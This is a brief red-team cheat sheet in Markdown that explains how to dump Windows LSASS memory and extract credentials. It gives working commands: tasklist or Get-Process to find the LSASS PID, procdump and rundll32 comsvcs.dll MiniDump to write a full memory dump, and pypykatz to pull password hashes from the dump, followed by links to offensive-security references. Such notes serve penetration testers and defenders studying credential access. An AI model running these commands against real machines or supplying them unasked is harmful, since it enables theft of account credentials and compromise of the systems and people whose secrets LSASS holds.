# Dump LSASS Memory

The LSASS memory may contain sensitive information, so we want to dump it.

## 1. Find the LSASS PID

```powershell
tasklist | findstr "lsass"
# or
Get-Process | findstr "lsass"
```

## 2. Dump LSASS Memory

- Using `procdump`

    ```powershell
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    ```

- Using `comsvcs.dll`

    ```powershell
    # Replace `1234` with actual PID
    rundll32 C:\Windows\System32\comsvcs.dll,MiniDump 1234 C:\Users\<user>\Desktop\lsass.dmp full
    ```

## 3. Dump Hashes from LSASS Memory

- Using `pypykatz`

    ```sh
    pypykatz lsa minidump lsass.dmp
    ```

## Resources

- [Dump Credentials from Lsass Process Without Mimikatz by Red Team Notes](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)
- [LSASS Secrets by The Hacker Recipes](https://www.thehacker.recipes/ad/movement/credentials/dumping/lsass)